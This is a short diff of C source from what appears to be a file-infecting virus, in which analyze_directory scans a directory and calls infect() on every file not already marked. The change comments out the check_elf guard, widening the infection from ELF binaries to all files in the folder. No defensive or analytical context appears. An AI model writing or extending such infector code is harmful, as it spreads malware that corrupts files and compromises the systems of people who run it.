@@ -51,14 +51,12 @@ void analyze_directory(const char *dirname, const char *string, size_t len)
                 //perror(path);
                 continue ;
             }
-            if (check_elf(fp))
-            {
+            //if (check_elf(fp))
                 //printf("Its elf: %s\n", path);
                 if (!check_infection(fp, string, len - 1))
                     infect(fp, string, len);
                 //else
                     //printf("Already infected.\n");
-            }
             fclose(fp);
         }
     }
